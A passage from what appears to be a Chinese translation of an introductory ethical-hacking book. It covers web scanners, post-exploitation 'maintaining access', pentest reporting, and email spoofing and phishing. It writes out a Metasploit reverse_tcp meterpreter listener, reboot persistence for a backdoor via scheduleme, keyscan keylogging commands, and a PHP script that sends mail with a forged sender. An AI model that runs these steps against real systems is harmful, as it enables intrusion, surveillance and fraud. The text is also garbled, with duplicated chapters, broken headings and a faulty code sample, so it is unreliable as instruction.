  \ 服务器的异常响应。`Untrusted` 报告下的漏洞可能是误报，需要手动审查。\n\n### w3af\n\n`w3af` 是另一个 Kali Linux\
  \ 免费轻量级扫描器。由 OWASP 安全社区开发。该工具的报告功能相对于 `Arachni` 有限，但仍可用 Web 服务器漏洞扫描的良好入门工具。使用 `w3af`\
  \ 最大的优势是它有多个插件可以从互联网下载。伦理黑客需要连接互联网才能使用 `w3af` 进行测试。如果没有互联网，此测试将产生很多错误，因为插件在测试扫描主机时会从互联网拉取脚本。\n\
  \n你可以如下在 Kali Linux 中启动 `w3af` 应用程序：点击 Applications > Kali Linux > Web Applications\
  \ > Vulnerability Scanners > `w3af`\n\n![](img/Image0012.jpg)\n\n这将启动 `w3af` 图形界面，其有一个没有插件的空配置。你可以通过选择所需的插件并点击菜单栏上的\
  \ `Profiles` > `Save As` 创建新配置。你也可以使用提供的预定义配置。你可以点击如 `OWASP_TOP10` 的配置并将其用于扫描。你可以对\
  \ `w3af` 可用的插件进行细粒度控制。也可以在启动扫描之前自定义预定义插件。但注意，在没有互联网连接的情况下执行扫描是一种尝试方法。在主选择窗口下还有另一个插件部分。这些插件可用于报告。所有生成的报告默认将保存到\
  \ `/root/`。我们在扫描示例中选择了 `OWASP_TOP10` 配置。我们还为扫描关闭了发现插件选项，并激活了 HTML 报告。\n\n![](img/Image0013.jpg)\n\
  \n我们将输入目标系统进行扫描并点击 `start` 按钮。由于我们没有激活任何插件，扫描将返回有限的结果。如果你希望以 HTML 格式查看结果，只需启动浏览器并导航到\
  \ `file:///root/report.html`。\n\n### Nikto\n\n`Nikto` 是 Kali Linux 中提供的另一个简单扫描器，可用于扫描\
  \ Web 服务器和 Web 应用程序。再次，此工具允许你每次只扫描一个主机，但工具中的 `output` 命令允许你跟踪每次扫描的摘要。你可以生成所有文件格式的报告，并将其作为\
  \ `Metasploit` 的输入。`Nikto` 发现的大多数漏洞引用了开源漏洞数据库 (OSVDB)。\n\n# Webssploit 第章：维持访问\n\
  \n![](img/Image00003.jpg)\n\n维持访问是渗透测试周期的第四阶段。本章将带你了解利用后执行的操作，以维持对受攻击目标系统的访问。利用计算机系统或网络是很不起的，但伦理黑客的目标是找到一种在利用后维持对目标系统访问的方法。有多种方法维持被利用系统的访问，但它们都有共同的动机：减少在第一次尝试被攻破后继续攻击同一台机器所需的时间和精力。如果伦理黑客正在工作，第一次尝试后可能需要再次访问受攻击的系统。\n\
  \n\n\n\n# Metasploit 使用指南\n\n1. `Msfconsole`\n2. `Use exploit/multi/handler`\n3.\
  \ `Set payload windows/meterpreter/reverse_tcp`\n4. `Set lhost {your_ip}`\n5. `Set\
  \ lport {port}`\n6. `Run`\n\n当你设置好 Metasploit 监听器并开始接收来自目标系统后门的回调连接时，是因为用户执行了 `unencoded-payload.exe`\
  \ 文件。\n\n## 持久化后门\n\n你可能记得在大学期间，你会定期回到父母家里取取衣服或寻求一些经济资助。同样，后门也会定期地从伦理黑客那里获取更多指令。\n\
  \n`meterpreter` 壳（shell）有一个 `scheduleme` 选项，可以实现这一点。你可以使用 `scheduleme` 调度命令在固定的间隔启动。或者，你也可以根据用户操作（如重启系统或登录系统）来调度命令的启动。\n\
  \n命令如下：`scheduleme -c {“file/command:} -i -l`。\n\n例如，你可以创建一个计划，当用户重启系统时启动 `unencoded-payload.exe`\
  \ 文件。该命令仅会在用户重启系统时执行一次。\n\n## 可检测性\n\n如果伦理黑客已经知道目标系统上运行的防病毒系统，他们可以将自己创建的木马或后门上传到以下网站，以查看世界上哪些防病毒软件已经拥有检测这些木马和后门的特征。\n\
  \n## 键盘记录器\n\n键盘记录是在用户或系统管理员在使用系统时记录其击键的过程。目前有多种第三方键盘记录应用程序可用，其中大多数都声称自己具有不被检测的能力。\n\
  \n虽然事实如此，但在系统上安装键盘记录器需要系统运行某些应用程序以便物理上挂载监听设备。第三方应用程序在做出此类声明时，并没有考虑到目标系统上的病毒扫描器或入侵检测系统。\n\
  \nMetasploit 内置了一个名为 `keyscan` 的工具。如果伦理黑客已经成功与目标系统建立会，那么使用 `keyscan` 工具的命令非常简单：\n\
  \n1. `Keyscan_start`\n2. `Keyscan_dump`\n3. `Keyscan_dump`（根据需要重复）\n4. `Keyscan_stop`\n\
  \n\n\n\n我们希望这一章能作为访问维护阶段的介绍。这仍然是充满恶意软件的宇宙中极小的一部分。恶意软件的发展可以把研究人员带到互联网最黑暗的角落，也可以帮助伦理黑客为全球计算机系统提供安全环境。当你使用\
  \ `Metasploit` 框架创建木马和后门时，你就能理解恶意攻击者的思维过程，因为伦理黑客的工作要求你和恶意攻击者的想法是一致的。\n\n# 第八章：报告\n\
  \n技术专长对于进行渗透测试非常重要，因为它能让你获得所需的结果，以验证组织数字基础设施的安全设置。组织的高层管理人员是聘佣伦理黑客团队进行渗透测试并为他们的评估付费的权威。在渗透测试活动结束后，管理层预计希望看到一份关于整个活动的报告。同样，组织内各个部门的技术负责人也希望了解他们所管理的系统或开发的软件中发现的漏洞，以便在需要时进行必要的修正。这使得`Reporting`报告）成为渗透测试生命周期中一个非常重要的阶段。测试报告被分为几个部分，我们将在本章中讨论它们。\n\
  \n让我们逐一回顾渗透测试报告的各个部分。\n\n## 渗透测试报告\n\n### 执行摘要\n渗透测试活动的亮点会在渗透测试报告的执行摘要部分提到。它提供了对评估的概述。这主要包括以下细节：\n\
  - 测试位置\n- 测试是远程还是本地的\n- 伦理黑客团队成员的详情\n- 信息系统安全设置及发现漏洞的详级描述\n\n该部分也是通过视觉化表示提出建议的好地方，例如使用图表和饼图来显示在目标系统上执行的所有漏洞利用。你应该将此部分限制在三段以内。该部分位于报告的开头，但大部分是在渗透测试报告的所有其他部分完成后才编写的。\n\
  \n### 参与程序\n此部分将包含伦理黑客团队的参与情况，以及遇到的限制和各种其他流程。该部分将描述在目标系统上进行的各种类型的测试。它将回答诸此类问题，例如“社会工程学是测试的一部分吗？”“是否进行了拒绝服务（DoS）攻击？”等。该部分将让每个人了解各种攻击面，以及在这些攻击面的哪些位置发现了漏洞。例如，一名伦理黑客通过互联网从远程位置对\
  \ Web 应用程序进行了测试，或者通过进入组织的无线网络范围进行了无线攻击。\n\n### 目标架构\n此部分是可选的，包含了有关目标基础设施的信息，例如他们的硬件、使用的操作系统、系统提供的服务、开放端口等。如果伦理黑客团队在渗透测试期间开发了网络拓图，此部分是放置这些信息的好地方。\n\
  \n### 发现结果\n渗透测试期间发现的所有漏洞都列在此部分中。根据发现漏洞的系统对这些漏洞进行分类是非常重要的，以便让相关团队拥有修正缺陷所需的信息。如果可能，应该将安全问题与监管合规相关联，这将有助于将成本追溯到资金来源。此部分还为系统所有者提供了修补这些缺陷的成本估计。\n\
  \n### 建议措施\n此部分定义了针对每个发现的漏洞应采取的修正措施。这可以作为一个独立的章节，描述每个漏洞，然后给出关于如何修复它的建议。修正措施不应定义具体的修复修复方法，而应该是通用的修复方案，以便系统所有者能够自己确定具体的修复方法。例如，对于发现默认密码的情况，应该有一个建议强制员工执行强密码策略。\n\
  \n### 结论\n此部分将用几行文字总结漏洞和建议的修正措施。你也可以在这一部分列出关键发现，以便系统所有者给予额外关注。\n\n### 附录\n此部分将涵盖所有支持报告且不能属于正文的信息。这包括原始测试数据、伦理黑客团队信息、术语表、定义、缩写列表以及团队中每个个人伦理黑客的职业简历。\n\
  \n### 演示\n大多数管理层希望以正式或半正式的方式演示渗透活动的结果简报。这还可能包含一份供伦理黑客进行汇报时使用的演示幻灯片。如果需要简要汇报（out\
  \ brief），应以专业的方式进行。作为了解基础设施中所有弱点的伦理黑客，在演示演示期间应避免攻击那些系统的所有者。你不应该针对系统管理或软件工程团队的同事，因为他们将是决定邀请谁对基础设施进行定期测试的人。因此，与他们所有人保持良好关系是非常重要的。相反，你可以展示事实和数字，这些将取代任何情绪且不会指责任何人。简而言之，只需讨论系统的缺点和高效修复它们的方法。\n\
  \n其他时候，管理层可能不需要演示，只需将报告交付给他们。在这种情况下，确保报告是正确的、打印得当的并且可以向管理层展示。有时可能会要求报告的电子版和纸质版。应对对创建的所有副本进行计数，并记录谁拥有所有副本。\n\
  \n### 报告和证据的存储\n某些组织会希望伦理黑客团队保留一份报告副本。渗透测试报告包含大量信息，如果落入错误的人手中将是灾难性的。因此，必须对每份报告副本负责。另一些组织可能会要求删除报告。伦理黑客团队应该在咨询法律顾问后这样做，因为这可能会产生法律后果。如果渗透测试是可以接受的，应确保报告被多次格式化和覆盖。在系统上进行渗透测试是有益的，并将帮助系统所有者。\n\
  \n# 第九章：邮件攻击\n\n邮件攻击并不是邮件的大部分，但它是人们每天落入陷阱的最常见方式。邮件攻击大多由黑帽客或白帽黑客执行。关于邮件攻击的知识将帮助教育员工如何预防邮件。因此，本书的目的是涵盖邮件攻击分类。\n\
  \n### 电子邮件是如何工作的？\n邮件服务器控制电子邮件的发送和接收。邮件提供者会在人们注册账户并接收电子邮件之前在服务器上进行配置。一旦电子邮件提供者对服务器的设置满意，他们就可以在全球范围内连接。\n\
  \n### 电子邮件在技术上是如何工作的？\n假设我们有两个电子邮件提供者，`serverone.com` 和 `serverwo.com`，并且 `userone@serverone.com`\
  \ 登录其账户并向 `serverwo.com` 编写邮件并点击发送，在几分钟内邮件被 `serverwo.com` 接收。\n\n### 幕后发生了什么？\n\
  它是简单的吗？当 `userone@serverone.com` 向 `serverwo.com` 发送邮件时，它使用域名系统（`DNS`）建立连接。然后它与\
  \ `serverwo.com` 通信关于 `userone@serverwo.com` 的邮件。这是当 `userwo` 在其域名中查找 `userwo.com`\
  \ 时，如果 `userwo` 存在，它进一步递送到 `userwo.com` 的收件箱。在此之后，当 `userwo` 坐在电脑前登录邮件账户时，他们发现了来自\
  \ `serverone.com` 的邮件。\n\n### 邮件服务协议\n\n#### SMTP\n`SMTP`（简单邮件传输协议）是在使用 `Microsoft\
  \ Outlook` 或 `Mozilla Thunderbird` 等邮件客户端发送邮件时使用的协议。当用户想要向另一个用户发送邮件时，`SMTP` 进入画面。`SMTP`\
  \ 工作在端口 `25` 或 `587` 以及带有 `SSL` 的端口 `465` 上。\n\n#### POP3\n`POP3`（邮局协议）允许用户从邮件服务器下载邮件到电脑上的本地邮件客户端。这是一个仅用于下载邮件的简单协议。当用户的邮件提供者提供的邮件服务器磁盘空间有限并希望为新邮件留出空间时，用户通常使用\
  \ `POP3` 协议。因此，他们使用 `POP3` 定隔从邮件服务器下载邮件到本地机器。`POP3` 协议使用不带 `SSL` 的端口 `110` 和带有 `SSL`\
  \ 的端口 `995`。\n\n#### IMAP\n`IMAP`（互联网消息访问协议）是一个类似于 `POP3` 的功能，用于从邮件服务器检索邮件到本地邮件客户端。然而，它与\
  \ `POP3`的区别在于 `IMAP` 使邮件服务器和邮件客户端之间的邮件同步。在使用 `IMAP` 协议时，邮件服务器和邮件客户端上的邮件是彼此的镜像副本。`IMAP`\
  \ 协议使用不带 `SSL` 的端口 `143` 和带有 `SSL` 的端口 `993`。\n\n### 邮件安全\n邮件是当今世界上最快的通信手段之一，但它安全吗？攻击者有一系列可以通过邮件应用的攻击。许多人对攻击毫无察觉并落入陷阱。组织的安全性也取决于其最薄弱的环节，有时一个毫无意识的员工就会成为最薄弱的环节。每封邮件的头部包含它在进入收件箱之前经过的路径的完整细节。查看邮件是否属于你是非常重要的。邮件头部将帮助你识别伪造邮件。邮件头部还有以下参数，它们本质上是邮件头部中最重要的部分：\n\
  - mailto\n- from\n- subject\n- message_body\n\n攻击者可以简单地在网络服务器上托管此 `.php` 文件，并用他们的选择替换这些参数以发送邮件。例如，他们可以使用\
  \ `info@amazon.com` 作为头部参数，收件者将相信他们收到了来自 `amazon.com` 的真实邮件。\n\n### 邮件伪造（Spoofing）\n\
  如所述，邮件伪造是操纵邮件头部使邮件看起来来自真实来源。垃圾邮件者利用邮件伪造让毫无防备的收件者打开邮件并回复请求。关于邮件伪造最危险的部分是使用你甚至不知道的\
  \ `FROM` 地址来伪造邮件。\n\n### 邮件伪造方法\n有很多方法可以伪造邮件，让我们讨论最常用的两种：\n\n##### 公中继服务器（Open Relay\
  \ Server）\n公中继服务器是一个运行 `SMTP` 的服务器，其配置方式允许任何人通过它发送邮件。这意味着未知用户也可以通过它发送邮件。攻击者可以使用\
  \ `telnet` 连接到中继服务器并输入指令发送邮件。通过中继服务器不需要身份验证。\n\n##### 邮件脚本（Email Scripts）\n另一种流行的邮件伪造方法是通过邮件脚本。邮件脚本最初开发是为了发送真实邮件，但攻击者很快意识到由于邮件脚本不需要身份验证，它也可以用于伪造。许多托管提供者意识到这可能导致服务器声誉受损，并对\
  \ `FROM` 地址实施限制。让我们看一个 PHP 邮件脚本的示例：\n\n```php\n<?\n$mailto=\"some-name@yourdomain.com\"\
  ;\n$pcount=0;\n$gcount=0;\n$subject = \"Mail from\";\n$from=\"some-name@abc.com\"\
  ;\nwhile (list($key,$val)=each($_POST])){\n    $pstr = $pstr.$key.\": \".$val.\"\
  \\n\";\n    $pcount++;\n}\nwhile (list($key,$val)=each($_GET)){\n    $gstr = $gstr.$key.\"\
  : \".$val.\"\\n\";\n    $gcount++;\n}\nif ($pcount > $gcount){\n    $message_body=$pstr;\n\
  \    mail($mailto,$subject,$message_body,\"From:\".$from);\n    echo \"Mail has\
  \ been sent\";\n}else{\n    $message_body=$gstr;\n    mail($mailto,$subject,$message_body,\"\
  From:\".$from);\n    echo \"Mail has been sent\";\n}\n?>\n```\n如果你查看这个 PHP 邮件脚本，你会发现它具有以下本质上是邮件头部最重要的参数：\n\
  \n#### 伪造邮件的后果\n如果伪造邮件被收件者认为，可能会导致后果：\n- 从你的邮件 ID 发送的一封关于炸弹的邮件可能让你在监狱度过余生。\n- 配偶之间包含伤害性信息的伪造邮件可能导致分手或离婚。\n\
  - 从你的邮件 ID 发送的一封包含辞职信的伪造邮件可能有不好的后果。\n- 伪造邮件可用于欺诈活动导致资金损失。\n\n#### 识别伪造邮件\n每封邮件的头部包含它在进入收件箱之前经过的路径的完整细节。查看邮件是否属于你是非常重要的。头部将帮助你识别伪造邮件。邮件主题类似于：\n\
  - 账户被盗了！\n- 你的银行账户被盗了。\n- 你的邮件请求存款\n- 你的邮件请求信息如下：\n- 立即修改密码\n\n此外，头部中的某些技术参数也能帮助你理解邮件是否被伪造。让我们看看\
  \ `gmail.com` 接收的以下邮件部分：\n\n`Received-SPF: pass (google.com: best record for domain\
  \ of postmaster@mail-sor-f6.google.com) client-ip=209.85.220.69`\n`Authentication-Results:\
  \ mx.google.com;dkim=pass header.i=@googlemail.com.s=201605;spf=pass (google.com:\
  \ best record for domain of postmaster@mail-sor-f.google.com) designates 209.85.220.69\
  \ as permitted sender) smtp.helo=mail-sor6.com;dmarc=pass (p=QUARANTINE sp=QUARANTINE\
  \ dis=NONE) from=googlemail.com`\n`DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;d=googlemail.com;\
  \ s=201605;h:to:auto-submitted:message-id:date:from:subject:references:in-reply-to;bh=cfcLUX2oA1dgPHL34Z1qoUnCvAkr1/oTXh1PoFQIY=;b=n0p3627rwiCw+XuL61+nFdd4fMdw5PlJMma6`\n\
  \n[/\n\n### 邮件钓鱼（Email Phishing）\n邮件是当今世界上最快的通信手段之一，但它安全吗？攻击者有一系列可以通过邮件应用的攻击。许多人对攻击毫无察觉并落入陷阱。组织的安全性也取决于其最薄弱的环节，有时一个毫无意识的员工就会成为最薄弱的环节。每封邮件的头部包含它在进入收件箱之前经过的路径的完整细节。查看邮件是否属于你是非常重要的。头部将帮助你识别伪造邮件。邮件头部还有以下参数，它们本质上是邮件头部中最重要的部分：\n\
  - mailto\n- from\n- subject\n- message_body\n\n攻击者可以简单地在网络服务器上托管此 `.php` 文件，并用他们的选择替换这些参数以发送邮件。例如，他们会创建一个类似于合法地址的邮件地址。\n\
  \n# 第九章：邮件钓鱼\n\n邮件钓鱼并不是邮件攻击的大部分，但它是人们每天落入陷阱的最常见方式。邮件钓鱼大多由黑帽客或白帽黑客执行。关于邮件钓鱼的知识将帮助教育员工如何预防邮件。因此，本书的目的是涵盖邮件攻击分类。\n\
  \n### 电子邮件是如何工作的？\n邮件服务器控制邮件的发送和接收。邮件提供者会在人们注册账户并接收邮件之前在服务器上进行配置。一旦邮件提供者对服务器的设置满意，他们就可以在全球范围内连接。\n\
  \n### 电子邮件在技术上是如何工作的？\n假设我们有两个邮件提供者，`serverone.com` 和 `serverwo.com`，并且 `userone@serverone.com`\
  \ 登录其账户并向 `serverwo.com` 编写邮件并点击发送，在几分钟内邮件被 `serverwo.com` 接收。\n\n### 幕后发生了什么？\n\
  它是简单的吗？当 `userone@serverone.com` 向 `serverwo.com` 发送邮件时，它使用域名系统（`DNS`）建立连接。然后它与\
  \ `serverwo.com` 通信关于 `userone@serverwo.com` 的邮件。这是当 `userwo` 在其域名中查找 `userwo.com`\
  \ 时，如果 `userwo` 存在，它进一步递送到 `userwo.com` 的收件箱。在此之后，当 `userwo` 坐在电脑前登录邮件账户时，他们发现了来自\
  \ `serverone.com` 的邮件。\n\n### 邮件服务协议\n\n#### SMTP\n`SMTP`（简单邮件传输协议）是在使用 `Microsoft\
  \ Outlook` 或 `Mozilla Thunderbird` 等邮件客户端发送邮件时使用的协议。当用户想要向另一个用户发送邮件时，`SMTP` 进入画面。`SMTP`\
  \ 工作在端口 `25` 或 `587` 以及带有 `SSL` 的端口 `465` 上。\n\n#### POP3\n`POP3`（邮局协议）允许用户从邮件服务器下载邮件到电脑上的本地邮件客户端。这是一个仅用于下载邮件的简单协议。当用户的邮件提供者提供的邮件服务器磁盘空间有限并希望为新邮件留出空间时，用户通常使用\
  \ `POP3` 协议。因此，他们使用 `POP3` 定隔从邮件服务器下载邮件到本地机器。`POP3` 协议使用不带 `SSL` 的端口 `110` 和带有 `SSL`\
  \ 的端口 `995`。\n\n#### IMAP\n`IMAP`（互联网消息访问协议）是一个类似于 `POP3` 的功能，用于从邮件服务器检索邮件到本地邮件客户端。然而，它与\
  \ `POP3`的区别在于 `IMAP` 使邮件服务器和邮件客户端之间的邮件同步。在使用 `IMAP` 协议时，邮件服务器和邮件客户端上的邮件是彼此的镜像副本。`IMAP`\
  \ 协议使用不带 `SSL` 的端口 `143` 和带有 `SSL` 的端口 `993`。\n\n### 邮件安全\n邮件是当今世界上最快的通信手段之一，但它安全吗？攻击者有一系列可以通过邮件应用的攻击。许多人对攻击毫无察觉并落入陷阱。组织的安全性也取决于其最薄弱的环节，有时一个毫无意识的员工就会成为最薄弱的环节。每封邮件的头部包含它在进入收件箱之前经过的路径的完整细节。查看邮件是否属于你是非常重要的。头部将帮助你识别伪造邮件。\n\
  \n### 钓鱼诈骗（Phishing Scams）\n常见的钓鱼邮件看起来像什么样？钓鱼邮件大多包含承诺你赢得了某些东西。攻击者依赖目标有多轻信来实施诈骗。在\
  \ 2000 年早期，攻击者发送邮件声称自己非常富有并想要将其送给普通人。然而，随着过程的进行，攻击者会要求用户向他们的账户转入少量资金。\n\n### 预防钓鱼\n\
  你可以遵循一些基本预防措施保护自己免受诈骗：\n- 确保仔细阅读邮件并双重检查发送者。如果发送者是认识的朋友，但邮件看起来有点奇怪，请给他们打电话确认他们是否发送了邮件。\n\
  - 如果邮件包含链接，在点击之前仔细检查链接。\n- 如果你由于由于点击了链接并进入了一个要求输入信息的网站，请检查浏览器中的 URL 以确认它确实是你熟悉的\
  \ URL。\n- 登录安装了数字证书并运行 `HTTPS` 的网站。\n\n### 保护你的邮件帐户\n简单的措施在保护自己免受邮件攻击方面大有用。一些简单的步骤：\n\
  - 当你设置新邮件账户时，始终配置一个辅助邮件账户或备用账户，以便在主账户被盗时帮助你恢复。\n- 不要忽视设置邮件账户的安全问题部分。设置真实的问题和真实的答案，因为安全问题会在账户被盗或你忘记密码时帮助你恢复。\n\
  - 作为一个法则，避免打开陌生人的邮件。\n- 始终使用自己的电脑检查邮件，不要使用别人的电脑，因为你可能会在上面登录邮件账户。\n- 无论多信任一个人，永远不要向他们透露密码。\n\
  \n### 结论\n我衷希望你喜欢这本书，它帮助你进入伦理黑客的世界。渗透测试生命周期每一章中提到的工具是伦理黑客最流行和最常用的工具。你可以将它们作为基础，探索\
  \ `Kali Linux` 中提供的其他工具，这些工具将帮助你在渗透测试生命周期的每一个阶段。我想以此结束语：伦理黑客是一个高尚的职业，而不是大众误解的犯罪活动。虽然恶意攻击确实是犯罪并应该被视为犯罪活动，但伦理黑客从不是、将来也永远不会被归类为犯罪。伦理黑客的主要目标是帮助公司处理\
  \ IT 政策和行业法规。伦理黑客的设计是为了防止恶意攻击。恶意攻击应该被防止，但同时需要促进鼓励创新、研究和技术突破的伦理黑客，以便大众意识到这一高尚的职业。现在你已经知道如何开始黑客学习，我的责任是你要为了正当的原因使用这些技能。那里有很多工作机会，而且对伦理黑客有许多尊重，所以请利用你的天赋并磨练你的技能。祝你的黑客活动顺利。\n\
